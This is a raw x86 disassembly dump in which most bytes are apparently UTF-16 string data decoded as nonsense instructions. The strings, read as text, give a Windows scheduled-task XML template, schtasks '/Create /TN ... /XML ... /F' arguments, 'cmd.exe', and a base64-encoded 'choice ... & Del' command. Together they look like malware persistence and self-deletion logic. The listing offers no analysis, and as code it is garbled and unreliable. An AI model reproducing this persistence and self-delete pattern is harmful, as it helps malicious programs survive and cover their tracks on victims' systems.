  40b88f:	2f                   	das
  40b890:	00 50 00             	add    %dl,0x0(%eax)
  40b893:	72 00                	jb     0x40b895
  40b895:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  40b89b:	69 00 70 00 61 00    	imul   $0x610070,(%eax),%eax
  40b8a1:	6c                   	insb   (%dx),%es:(%edi)
  40b8a2:	00 73 00             	add    %dh,0x0(%ebx)
  40b8a5:	3e 00 0a             	add    %cl,%ds:(%edx)
  40b8a8:	00 20                	add    %ah,(%eax)
  40b8aa:	00 20                	add    %ah,(%eax)
  40b8ac:	00 20                	add    %ah,(%eax)
  40b8ae:	00 20                	add    %ah,(%eax)
  40b8b0:	00 20                	add    %ah,(%eax)
  40b8b2:	00 20                	add    %ah,(%eax)
  40b8b4:	00 20                	add    %ah,(%eax)
  40b8b6:	00 20                	add    %ah,(%eax)
  40b8b8:	00 20                	add    %ah,(%eax)
  40b8ba:	00 20                	add    %ah,(%eax)
  40b8bc:	00 20                	add    %ah,(%eax)
  40b8be:	00 20                	add    %ah,(%eax)
  40b8c0:	00 20                	add    %ah,(%eax)
  40b8c2:	00 20                	add    %ah,(%eax)
  40b8c4:	00 20                	add    %ah,(%eax)
  40b8c6:	00 20                	add    %ah,(%eax)
  40b8c8:	00 20                	add    %ah,(%eax)
  40b8ca:	00 20                	add    %ah,(%eax)
  40b8cc:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b8cf:	53                   	push   %ebx
  40b8d0:	00 65 00             	add    %ah,0x0(%ebp)
  40b8d3:	74 00                	je     0x40b8d5
  40b8d5:	74 00                	je     0x40b8d7
  40b8d7:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b8dd:	73 00                	jae    0x40b8df
  40b8df:	3e 00 0a             	add    %cl,%ds:(%edx)
  40b8e2:	00 20                	add    %ah,(%eax)
  40b8e4:	00 20                	add    %ah,(%eax)
  40b8e6:	00 20                	add    %ah,(%eax)
  40b8e8:	00 20                	add    %ah,(%eax)
  40b8ea:	00 20                	add    %ah,(%eax)
  40b8ec:	00 20                	add    %ah,(%eax)
  40b8ee:	00 20                	add    %ah,(%eax)
  40b8f0:	00 20                	add    %ah,(%eax)
  40b8f2:	00 20                	add    %ah,(%eax)
  40b8f4:	00 20                	add    %ah,(%eax)
  40b8f6:	00 20                	add    %ah,(%eax)
  40b8f8:	00 20                	add    %ah,(%eax)
  40b8fa:	00 20                	add    %ah,(%eax)
  40b8fc:	00 20                	add    %ah,(%eax)
  40b8fe:	00 20                	add    %ah,(%eax)
  40b900:	00 20                	add    %ah,(%eax)
  40b902:	00 20                	add    %ah,(%eax)
  40b904:	00 20                	add    %ah,(%eax)
  40b906:	00 20                	add    %ah,(%eax)
  40b908:	00 20                	add    %ah,(%eax)
  40b90a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b90d:	45                   	inc    %ebp
  40b90e:	00 78 00             	add    %bh,0x0(%eax)
  40b911:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b915:	75 00                	jne    0x40b917
  40b917:	74 00                	je     0x40b919
  40b919:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b91f:	54                   	push   %esp
  40b920:	00 69 00             	add    %ch,0x0(%ecx)
  40b923:	6d                   	insl   (%dx),%es:(%edi)
  40b924:	00 65 00             	add    %ah,0x0(%ebp)
  40b927:	4c                   	dec    %esp
  40b928:	00 69 00             	add    %ch,0x0(%ecx)
  40b92b:	6d                   	insl   (%dx),%es:(%edi)
  40b92c:	00 69 00             	add    %ch,0x0(%ecx)
  40b92f:	74 00                	je     0x40b931
  40b931:	3e 00 50 00          	add    %dl,%ds:0x0(%eax)
  40b935:	54                   	push   %esp
  40b936:	00 30                	add    %dh,(%eax)
  40b938:	00 53 00             	add    %dl,0x0(%ebx)
  40b93b:	3c 00                	cmp    $0x0,%al
  40b93d:	2f                   	das
  40b93e:	00 45 00             	add    %al,0x0(%ebp)
  40b941:	78 00                	js     0x40b943
  40b943:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b947:	75 00                	jne    0x40b949
  40b949:	74 00                	je     0x40b94b
  40b94b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b951:	54                   	push   %esp
  40b952:	00 69 00             	add    %ch,0x0(%ecx)
  40b955:	6d                   	insl   (%dx),%es:(%edi)
  40b956:	00 65 00             	add    %ah,0x0(%ebp)
  40b959:	4c                   	dec    %esp
  40b95a:	00 69 00             	add    %ch,0x0(%ecx)
  40b95d:	6d                   	insl   (%dx),%es:(%edi)
  40b95e:	00 69 00             	add    %ch,0x0(%ecx)
  40b961:	74 00                	je     0x40b963
  40b963:	3e 00 0a             	add    %cl,%ds:(%edx)
  40b966:	00 20                	add    %ah,(%eax)
  40b968:	00 20                	add    %ah,(%eax)
  40b96a:	00 20                	add    %ah,(%eax)
  40b96c:	00 20                	add    %ah,(%eax)
  40b96e:	00 20                	add    %ah,(%eax)
  40b970:	00 20                	add    %ah,(%eax)
  40b972:	00 20                	add    %ah,(%eax)
  40b974:	00 20                	add    %ah,(%eax)
  40b976:	00 20                	add    %ah,(%eax)
  40b978:	00 20                	add    %ah,(%eax)
  40b97a:	00 20                	add    %ah,(%eax)
  40b97c:	00 20                	add    %ah,(%eax)
  40b97e:	00 20                	add    %ah,(%eax)
  40b980:	00 20                	add    %ah,(%eax)
  40b982:	00 20                	add    %ah,(%eax)
  40b984:	00 20                	add    %ah,(%eax)
  40b986:	00 20                	add    %ah,(%eax)
  40b988:	00 20                	add    %ah,(%eax)
  40b98a:	00 20                	add    %ah,(%eax)
  40b98c:	00 20                	add    %ah,(%eax)
  40b98e:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b991:	44                   	inc    %esp
  40b992:	00 69 00             	add    %ch,0x0(%ecx)
  40b995:	73 00                	jae    0x40b997
  40b997:	61                   	popa
  40b998:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40b99c:	00 6f 00             	add    %ch,0x0(%edi)
  40b99f:	77 00                	ja     0x40b9a1
  40b9a1:	53                   	push   %ebx
  40b9a2:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b9a6:	00 72 00             	add    %dh,0x0(%edx)
  40b9a9:	74 00                	je     0x40b9ab
  40b9ab:	49                   	dec    %ecx
  40b9ac:	00 66 00             	add    %ah,0x0(%esi)
  40b9af:	4f                   	dec    %edi
  40b9b0:	00 6e 00             	add    %ch,0x0(%esi)
  40b9b3:	42                   	inc    %edx
  40b9b4:	00 61 00             	add    %ah,0x0(%ecx)
  40b9b7:	74 00                	je     0x40b9b9
  40b9b9:	74 00                	je     0x40b9bb
  40b9bb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9bf:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40b9c5:	3e 00 66 00          	add    %ah,%ds:0x0(%esi)
  40b9c9:	61                   	popa
  40b9ca:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40b9ce:	00 65 00             	add    %ah,0x0(%ebp)
  40b9d1:	3c 00                	cmp    $0x0,%al
  40b9d3:	2f                   	das
  40b9d4:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40b9d8:	00 73 00             	add    %dh,0x0(%ebx)
  40b9db:	61                   	popa
  40b9dc:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40b9e0:	00 6f 00             	add    %ch,0x0(%edi)
  40b9e3:	77 00                	ja     0x40b9e5
  40b9e5:	53                   	push   %ebx
  40b9e6:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b9ea:	00 72 00             	add    %dh,0x0(%edx)
  40b9ed:	74 00                	je     0x40b9ef
  40b9ef:	49                   	dec    %ecx
  40b9f0:	00 66 00             	add    %ah,0x0(%esi)
  40b9f3:	4f                   	dec    %edi
  40b9f4:	00 6e 00             	add    %ch,0x0(%esi)
  40b9f7:	42                   	inc    %edx
  40b9f8:	00 61 00             	add    %ah,0x0(%ecx)
  40b9fb:	74 00                	je     0x40b9fd
  40b9fd:	74 00                	je     0x40b9ff
  40b9ff:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba03:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40ba09:	3e 00 0a             	add    %cl,%ds:(%edx)
  40ba0c:	00 20                	add    %ah,(%eax)
  40ba0e:	00 20                	add    %ah,(%eax)
  40ba10:	00 20                	add    %ah,(%eax)
  40ba12:	00 20                	add    %ah,(%eax)
  40ba14:	00 20                	add    %ah,(%eax)
  40ba16:	00 20                	add    %ah,(%eax)
  40ba18:	00 20                	add    %ah,(%eax)
  40ba1a:	00 20                	add    %ah,(%eax)
  40ba1c:	00 20                	add    %ah,(%eax)
  40ba1e:	00 20                	add    %ah,(%eax)
  40ba20:	00 20                	add    %ah,(%eax)
  40ba22:	00 20                	add    %ah,(%eax)
  40ba24:	00 20                	add    %ah,(%eax)
  40ba26:	00 20                	add    %ah,(%eax)
  40ba28:	00 20                	add    %ah,(%eax)
  40ba2a:	00 20                	add    %ah,(%eax)
  40ba2c:	00 20                	add    %ah,(%eax)
  40ba2e:	00 20                	add    %ah,(%eax)
  40ba30:	00 20                	add    %ah,(%eax)
  40ba32:	00 20                	add    %ah,(%eax)
  40ba34:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40ba37:	4d                   	dec    %ebp
  40ba38:	00 75 00             	add    %dh,0x0(%ebp)
  40ba3b:	6c                   	insb   (%dx),%es:(%edi)
  40ba3c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40ba40:	00 70 00             	add    %dh,0x0(%eax)
  40ba43:	6c                   	insb   (%dx),%es:(%edi)
  40ba44:	00 65 00             	add    %ah,0x0(%ebp)
  40ba47:	49                   	dec    %ecx
  40ba48:	00 6e 00             	add    %ch,0x0(%esi)
  40ba4b:	73 00                	jae    0x40ba4d
  40ba4d:	74 00                	je     0x40ba4f
  40ba4f:	61                   	popa
  40ba50:	00 6e 00             	add    %ch,0x0(%esi)
  40ba53:	63 00                	arpl   %eax,(%eax)
  40ba55:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ba59:	50                   	push   %eax
  40ba5a:	00 6f 00             	add    %ch,0x0(%edi)
  40ba5d:	6c                   	insb   (%dx),%es:(%edi)
  40ba5e:	00 69 00             	add    %ch,0x0(%ecx)
  40ba61:	63 00                	arpl   %eax,(%eax)
  40ba63:	79 00                	jns    0x40ba65
  40ba65:	3e 00 50 00          	add    %dl,%ds:0x0(%eax)
  40ba69:	61                   	popa
  40ba6a:	00 72 00             	add    %dh,0x0(%edx)
  40ba6d:	61                   	popa
  40ba6e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ba72:	00 65 00             	add    %ah,0x0(%ebp)
  40ba75:	6c                   	insb   (%dx),%es:(%edi)
  40ba76:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40ba79:	2f                   	das
  40ba7a:	00 4d 00             	add    %cl,0x0(%ebp)
  40ba7d:	75 00                	jne    0x40ba7f
  40ba7f:	6c                   	insb   (%dx),%es:(%edi)
  40ba80:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40ba84:	00 70 00             	add    %dh,0x0(%eax)
  40ba87:	6c                   	insb   (%dx),%es:(%edi)
  40ba88:	00 65 00             	add    %ah,0x0(%ebp)
  40ba8b:	49                   	dec    %ecx
  40ba8c:	00 6e 00             	add    %ch,0x0(%esi)
  40ba8f:	73 00                	jae    0x40ba91
  40ba91:	74 00                	je     0x40ba93
  40ba93:	61                   	popa
  40ba94:	00 6e 00             	add    %ch,0x0(%esi)
  40ba97:	63 00                	arpl   %eax,(%eax)
  40ba99:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ba9d:	50                   	push   %eax
  40ba9e:	00 6f 00             	add    %ch,0x0(%edi)
  40baa1:	6c                   	insb   (%dx),%es:(%edi)
  40baa2:	00 69 00             	add    %ch,0x0(%ecx)
  40baa5:	63 00                	arpl   %eax,(%eax)
  40baa7:	79 00                	jns    0x40baa9
  40baa9:	3e 00 0a             	add    %cl,%ds:(%edx)
  40baac:	00 20                	add    %ah,(%eax)
  40baae:	00 20                	add    %ah,(%eax)
  40bab0:	00 20                	add    %ah,(%eax)
  40bab2:	00 20                	add    %ah,(%eax)
  40bab4:	00 20                	add    %ah,(%eax)
  40bab6:	00 20                	add    %ah,(%eax)
  40bab8:	00 20                	add    %ah,(%eax)
  40baba:	00 20                	add    %ah,(%eax)
  40babc:	00 20                	add    %ah,(%eax)
  40babe:	00 20                	add    %ah,(%eax)
  40bac0:	00 20                	add    %ah,(%eax)
  40bac2:	00 20                	add    %ah,(%eax)
  40bac4:	00 20                	add    %ah,(%eax)
  40bac6:	00 20                	add    %ah,(%eax)
  40bac8:	00 20                	add    %ah,(%eax)
  40baca:	00 20                	add    %ah,(%eax)
  40bacc:	00 20                	add    %ah,(%eax)
  40bace:	00 20                	add    %ah,(%eax)
  40bad0:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40bad3:	2f                   	das
  40bad4:	00 53 00             	add    %dl,0x0(%ebx)
  40bad7:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  40badc:	00 69 00             	add    %ch,0x0(%ecx)
  40badf:	6e                   	outsb  %ds:(%esi),(%dx)
  40bae0:	00 67 00             	add    %ah,0x0(%edi)
  40bae3:	73 00                	jae    0x40bae5
  40bae5:	3e 00 0a             	add    %cl,%ds:(%edx)
  40bae8:	00 20                	add    %ah,(%eax)
  40baea:	00 20                	add    %ah,(%eax)
  40baec:	00 20                	add    %ah,(%eax)
  40baee:	00 20                	add    %ah,(%eax)
  40baf0:	00 20                	add    %ah,(%eax)
  40baf2:	00 20                	add    %ah,(%eax)
  40baf4:	00 20                	add    %ah,(%eax)
  40baf6:	00 20                	add    %ah,(%eax)
  40baf8:	00 20                	add    %ah,(%eax)
  40bafa:	00 20                	add    %ah,(%eax)
  40bafc:	00 20                	add    %ah,(%eax)
  40bafe:	00 20                	add    %ah,(%eax)
  40bb00:	00 20                	add    %ah,(%eax)
  40bb02:	00 20                	add    %ah,(%eax)
  40bb04:	00 20                	add    %ah,(%eax)
  40bb06:	00 20                	add    %ah,(%eax)
  40bb08:	00 20                	add    %ah,(%eax)
  40bb0a:	00 20                	add    %ah,(%eax)
  40bb0c:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40bb0f:	41                   	inc    %ecx
  40bb10:	00 63 00             	add    %ah,0x0(%ebx)
  40bb13:	74 00                	je     0x40bb15
  40bb15:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bb1b:	73 00                	jae    0x40bb1d
  40bb1d:	3e 00 0a             	add    %cl,%ds:(%edx)
  40bb20:	00 20                	add    %ah,(%eax)
  40bb22:	00 20                	add    %ah,(%eax)
  40bb24:	00 20                	add    %ah,(%eax)
  40bb26:	00 20                	add    %ah,(%eax)
  40bb28:	00 20                	add    %ah,(%eax)
  40bb2a:	00 20                	add    %ah,(%eax)
  40bb2c:	00 20                	add    %ah,(%eax)
  40bb2e:	00 20                	add    %ah,(%eax)
  40bb30:	00 20                	add    %ah,(%eax)
  40bb32:	00 20                	add    %ah,(%eax)
  40bb34:	00 20                	add    %ah,(%eax)
  40bb36:	00 20                	add    %ah,(%eax)
  40bb38:	00 20                	add    %ah,(%eax)
  40bb3a:	00 20                	add    %ah,(%eax)
  40bb3c:	00 20                	add    %ah,(%eax)
  40bb3e:	00 20                	add    %ah,(%eax)
  40bb40:	00 20                	add    %ah,(%eax)
  40bb42:	00 20                	add    %ah,(%eax)
  40bb44:	00 20                	add    %ah,(%eax)
  40bb46:	00 20                	add    %ah,(%eax)
  40bb48:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40bb4b:	45                   	inc    %ebp
  40bb4c:	00 78 00             	add    %bh,0x0(%eax)
  40bb4f:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb53:	3e 00 0a             	add    %cl,%ds:(%edx)
  40bb56:	00 20                	add    %ah,(%eax)
  40bb58:	00 20                	add    %ah,(%eax)
  40bb5a:	00 20                	add    %ah,(%eax)
  40bb5c:	00 20                	add    %ah,(%eax)
  40bb5e:	00 20                	add    %ah,(%eax)
  40bb60:	00 20                	add    %ah,(%eax)
  40bb62:	00 20                	add    %ah,(%eax)
  40bb64:	00 20                	add    %ah,(%eax)
  40bb66:	00 20                	add    %ah,(%eax)
  40bb68:	00 20                	add    %ah,(%eax)
  40bb6a:	00 20                	add    %ah,(%eax)
  40bb6c:	00 20                	add    %ah,(%eax)
  40bb6e:	00 20                	add    %ah,(%eax)
  40bb70:	00 20                	add    %ah,(%eax)
  40bb72:	00 20                	add    %ah,(%eax)
  40bb74:	00 20                	add    %ah,(%eax)
  40bb76:	00 20                	add    %ah,(%eax)
  40bb78:	00 20                	add    %ah,(%eax)
  40bb7a:	00 20                	add    %ah,(%eax)
  40bb7c:	00 20                	add    %ah,(%eax)
  40bb7e:	00 20                	add    %ah,(%eax)
  40bb80:	00 20                	add    %ah,(%eax)
  40bb82:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40bb85:	43                   	inc    %ebx
  40bb86:	00 6f 00             	add    %ch,0x0(%edi)
  40bb89:	6d                   	insl   (%dx),%es:(%edi)
  40bb8a:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb8d:	61                   	popa
  40bb8e:	00 6e 00             	add    %ch,0x0(%esi)
  40bb91:	64 00 3e             	add    %bh,%fs:(%esi)
  40bb94:	00 01                	add    %al,(%ecx)
  40bb96:	80 b7 3c 00 2f 00 43 	xorb   $0x43,0x2f003c(%edi)
  40bb9d:	00 6f 00             	add    %ch,0x0(%edi)
  40bba0:	6d                   	insl   (%dx),%es:(%edi)
  40bba1:	00 6d 00             	add    %ch,0x0(%ebp)
  40bba4:	61                   	popa
  40bba5:	00 6e 00             	add    %ch,0x0(%esi)
  40bba8:	64 00 3e             	add    %bh,%fs:(%esi)
  40bbab:	00 0a                	add    %cl,(%edx)
  40bbad:	00 20                	add    %ah,(%eax)
  40bbaf:	00 20                	add    %ah,(%eax)
  40bbb1:	00 20                	add    %ah,(%eax)
  40bbb3:	00 20                	add    %ah,(%eax)
  40bbb5:	00 20                	add    %ah,(%eax)
  40bbb7:	00 20                	add    %ah,(%eax)
  40bbb9:	00 20                	add    %ah,(%eax)
  40bbbb:	00 20                	add    %ah,(%eax)
  40bbbd:	00 20                	add    %ah,(%eax)
  40bbbf:	00 20                	add    %ah,(%eax)
  40bbc1:	00 20                	add    %ah,(%eax)
  40bbc3:	00 20                	add    %ah,(%eax)
  40bbc5:	00 20                	add    %ah,(%eax)
  40bbc7:	00 20                	add    %ah,(%eax)
  40bbc9:	00 20                	add    %ah,(%eax)
  40bbcb:	00 20                	add    %ah,(%eax)
  40bbcd:	00 20                	add    %ah,(%eax)
  40bbcf:	00 20                	add    %ah,(%eax)
  40bbd1:	00 20                	add    %ah,(%eax)
  40bbd3:	00 20                	add    %ah,(%eax)
  40bbd5:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40bbd8:	2f                   	das
  40bbd9:	00 45 00             	add    %al,0x0(%ebp)
  40bbdc:	78 00                	js     0x40bbde
  40bbde:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bbe2:	3e 00 0a             	add    %cl,%ds:(%edx)
  40bbe5:	00 20                	add    %ah,(%eax)
  40bbe7:	00 20                	add    %ah,(%eax)
  40bbe9:	00 20                	add    %ah,(%eax)
  40bbeb:	00 20                	add    %ah,(%eax)
  40bbed:	00 20                	add    %ah,(%eax)
  40bbef:	00 20                	add    %ah,(%eax)
  40bbf1:	00 20                	add    %ah,(%eax)
  40bbf3:	00 20                	add    %ah,(%eax)
  40bbf5:	00 20                	add    %ah,(%eax)
  40bbf7:	00 20                	add    %ah,(%eax)
  40bbf9:	00 20                	add    %ah,(%eax)
  40bbfb:	00 20                	add    %ah,(%eax)
  40bbfd:	00 20                	add    %ah,(%eax)
  40bbff:	00 20                	add    %ah,(%eax)
  40bc01:	00 20                	add    %ah,(%eax)
  40bc03:	00 20                	add    %ah,(%eax)
  40bc05:	00 20                	add    %ah,(%eax)
  40bc07:	00 20                	add    %ah,(%eax)
  40bc09:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40bc0c:	2f                   	das
  40bc0d:	00 41 00             	add    %al,0x0(%ecx)
  40bc10:	63 00                	arpl   %eax,(%eax)
  40bc12:	74 00                	je     0x40bc14
  40bc14:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bc1a:	73 00                	jae    0x40bc1c
  40bc1c:	3e 00 0a             	add    %cl,%ds:(%edx)
  40bc1f:	00 20                	add    %ah,(%eax)
  40bc21:	00 20                	add    %ah,(%eax)
  40bc23:	00 20                	add    %ah,(%eax)
  40bc25:	00 20                	add    %ah,(%eax)
  40bc27:	00 20                	add    %ah,(%eax)
  40bc29:	00 20                	add    %ah,(%eax)
  40bc2b:	00 20                	add    %ah,(%eax)
  40bc2d:	00 20                	add    %ah,(%eax)
  40bc2f:	00 20                	add    %ah,(%eax)
  40bc31:	00 20                	add    %ah,(%eax)
  40bc33:	00 20                	add    %ah,(%eax)
  40bc35:	00 20                	add    %ah,(%eax)
  40bc37:	00 20                	add    %ah,(%eax)
  40bc39:	00 20                	add    %ah,(%eax)
  40bc3b:	00 20                	add    %ah,(%eax)
  40bc3d:	00 20                	add    %ah,(%eax)
  40bc3f:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40bc42:	2f                   	das
  40bc43:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40bc47:	00 73 00             	add    %dh,0x0(%ebx)
  40bc4a:	6b 00 3e             	imul   $0x3e,(%eax),%eax
  40bc4d:	00 00                	add    %al,(%eax)
  40bc4f:	1b 2f                	sbb    (%edi),%ebp
  40bc51:	00 43 00             	add    %al,0x0(%ebx)
  40bc54:	72 00                	jb     0x40bc56
  40bc56:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40bc5a:	74 00                	je     0x40bc5c
  40bc5c:	65 00 20             	add    %ah,%gs:(%eax)
  40bc5f:	00 2f                	add    %ch,(%edi)
  40bc61:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40bc65:	00 20                	add    %ah,(%eax)
  40bc67:	00 22                	add    %ah,(%edx)
  40bc69:	00 00                	add    %al,(%eax)
  40bc6b:	11 22                	adc    %esp,(%edx)
  40bc6d:	00 20                	add    %ah,(%eax)
  40bc6f:	00 2f                	add    %ch,(%edi)
  40bc71:	00 58 00             	add    %bl,0x0(%eax)
  40bc74:	4d                   	dec    %ebp
  40bc75:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40bc79:	00 22                	add    %ah,(%edx)
  40bc7b:	00 00                	add    %al,(%eax)
  40bc7d:	09 22                	or     %esp,(%edx)
  40bc7f:	00 20                	add    %ah,(%eax)
  40bc81:	00 2f                	add    %ch,(%edi)
  40bc83:	00 46 00             	add    %al,0x0(%esi)
  40bc86:	00 0f                	add    %cl,(%edi)
  40bc88:	53                   	push   %ebx
  40bc89:	00 55 00             	add    %dl,0x0(%ebp)
  40bc8c:	43                   	inc    %ebx
  40bc8d:	00 43 00             	add    %al,0x0(%ebx)
  40bc90:	45                   	inc    %ebp
  40bc91:	00 53 00             	add    %dl,0x0(%ebx)
  40bc94:	53                   	push   %ebx
  40bc95:	00 00                	add    %al,(%eax)
  40bc97:	61                   	popa
  40bc98:	4c                   	dec    %esp
  40bc99:	00 30                	add    %dh,(%eax)
  40bc9b:	00 4d 00             	add    %cl,0x0(%ebp)
  40bc9e:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40bca2:	32 00                	xor    (%eax),%al
  40bca4:	68 00 76 00 61       	push   $0x61007600
  40bca9:	00 57 00             	add    %dl,0x0(%edi)
  40bcac:	4e                   	dec    %esi
  40bcad:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40bcb1:	00 43 00             	add    %al,0x0(%ebx)
  40bcb4:	39 00                	cmp    %eax,(%eax)
  40bcb6:	44                   	inc    %esp
  40bcb7:	00 49 00             	add    %cl,0x0(%ecx)
  40bcba:	46                   	inc    %esi
  40bcbb:	00 6b 00             	add    %ch,0x0(%ebx)
  40bcbe:	67 00 4c 00          	add    %cl,0x0(%si)
  40bcc2:	30 00                	xor    %al,(%eax)
  40bcc4:	34 00                	xor    $0x0,%al
  40bcc6:	67 00 4c 00          	add    %cl,0x0(%si)
  40bcca:	30 00                	xor    %al,(%eax)
  40bccc:	51                   	push   %ecx
  40bccd:	00 67 00             	add    %ah,0x0(%edi)
  40bcd0:	57                   	push   %edi
  40bcd1:	00 53 00             	add    %dl,0x0(%ebx)
  40bcd4:	41                   	inc    %ecx
  40bcd5:	00 76 00             	add    %dh,0x0(%esi)
  40bcd8:	56                   	push   %esi
  40bcd9:	00 43 00             	add    %al,0x0(%ebx)
  40bcdc:	41                   	inc    %ecx
  40bcdd:	00 7a 00             	add    %bh,0x0(%edx)
  40bce0:	49                   	dec    %ecx
  40bce1:	00 43 00             	add    %al,0x0(%ebx)
  40bce4:	59                   	pop    %ecx
  40bce5:	00 67 00             	add    %ah,0x0(%edi)
  40bce8:	52                   	push   %edx
  40bce9:	00 47 00             	add    %al,0x0(%edi)
  40bcec:	56                   	push   %esi
  40bced:	00 73 00             	add    %dh,0x0(%ebx)
  40bcf0:	49                   	dec    %ecx
  40bcf1:	00 43 00             	add    %al,0x0(%ebx)
  40bcf4:	49                   	dec    %ecx
  40bcf5:	00 3d 00 00 0f 63    	add    %bh,0x630f0000
  40bcfb:	00 6d 00             	add    %ch,0x0(%ebp)
  40bcfe:	64 00 2e             	add    %ch,%fs:(%esi)
  40bd01:	00 65 00             	add    %ah,0x0(%ebp)
  40bd04:	78 00                	js     0x40bd06
  40bd06:	65 00 00             	add    %al,%gs:(%eax)
  40bd09:	00 00                	add    %al,(%eax)
  40bd0b:	00 0c 46             	add    %cl,(%esi,%eax,2)
  40bd0e:	d6                   	salc
  40bd0f:	f8                   	clc
  40bd10:	05 73 40 47 ae       	add    $0xae474073,%eax
  40bd15:	a3 95 fe a9 3b       	mov    %eax,0x3ba9fe95
  40bd1a:	36 c1 00 08          	roll   $0x8,%ss:(%eax)
  40bd1e:	b7 7a                	mov    $0x7a,%bh
  40bd20:	5c                   	pop    %esp
  40bd21:	56                   	push   %esi
  40bd22:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bd25:	89 02                	mov    %eax,(%edx)
  40bd27:	06                   	push   %es
  40bd28:	07                   	pop    %es
  40bd29:	02 02                	add    (%edx),%al
  40bd2b:	00 02                	add    %al,(%edx)
  40bd2d:	00 01                	add    %al,(%ecx)
  40bd2f:	08 00                	or     %al,(%eax)
  40bd31:	03 09                	add    (%ecx),%ecx
  40bd33:	07                   	pop    %es
  40bd34:	10 09                	adc    %cl,(%ecx)
  40bd36:	10 09                	adc    %cl,(%ecx)
  40bd38:	0c 00                	or     $0x0,%al
  40bd3a:	06                   	push   %es
  40bd3b:	09 07                	or     %eax,(%edi)
  40bd3d:	1d 05 08 1d 05       	sbb    $0x51d0805,%eax
  40bd42:	08 10                	or     %dl,(%eax)
  40bd44:	08 0e                	or     %cl,(%esi)
  40bd46:	00 08                	add    %cl,(%eax)
  40bd48:	09 07                	or     %eax,(%edi)
  40bd4a:	1d 05 08 1d 05       	sbb    $0x51d0805,%eax
  40bd4f:	08 09                	or     %cl,(%ecx)
  40bd51:	10 08                	adc    %cl,(%eax)
  40bd53:	18 05 00 02 18 08    	sbb    %al,0x8180200
  40bd59:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40bd5c:	01 18                	add    %ebx,(%eax)
  40bd5e:	18 06                	sbb    %al,(%esi)
  40bd60:	00 01                	add    %al,(%ecx)
  40bd62:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bd67:	00 02                	add    %al,(%edx)
  40bd69:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  40bd6e:	03 20                	add    (%eax),%esp
  40bd70:	00 01                	add    %al,(%ecx)
  40bd72:	08 06                	or     %al,(%esi)
  40bd74:	15 12 09 02 0e       	adc    $0xe020912,%eax
  40bd79:	12 0d 02 06 0e 06    	adc    0x60e0602,%cl
  40bd7f:	20 01                	and    %al,(%ecx)
  40bd81:	12 11                	adc    (%ecx),%dl
  40bd83:	12 3c 07             	adc    (%edi,%eax,1),%bh
  40bd86:	00 02                	add    %al,(%edx)
  40bd88:	12 0d 1c 12 15 02    	adc    0x215121c,%cl
  40bd8e:	06                   	push   %es
  40bd8f:	08 03                	or     %al,(%ebx)
  40bd91:	06                   	push   %es
  40bd92:	11 21                	adc    %esp,(%ecx)
  40bd94:	03 06                	add    (%esi),%eax
  40bd96:	12 3c 03             	adc    (%ebx,%eax,1),%bh
  40bd99:	06                   	push   %es
  40bd9a:	12 0c 03             	adc    (%ebx,%eax,1),%cl
  40bd9d:	06                   	push   %es
  40bd9e:	1d 05 02 06 1c       	sbb    $0x1c060205,%eax
  40bda3:	07                   	pop    %es
  40bda4:	06                   	push   %es
  40bda5:	15 11 25 01 1d       	adc    $0x1d012511,%eax
  40bdaa:	05 06 06 15 11       	add    $0x11150606,%eax
  40bdaf:	25 01 02 03 06       	and    $0x6030201,%eax
  40bdb4:	11 29                	adc    %ebp,(%ecx)
  40bdb6:	03 06                	add    (%esi),%eax
  40bdb8:	12 2d 05 20 01 01    	adc    0x1012005,%ch
  40bdbe:	12 1d 08 00 02 1d    	adc    0x1d020008,%bl
  40bdc4:	05 1d 05 1d 05       	add    $0x51d051d,%eax
  40bdc9:	07                   	pop    %es
  40bdca:	20 02                	and    %al,(%edx)
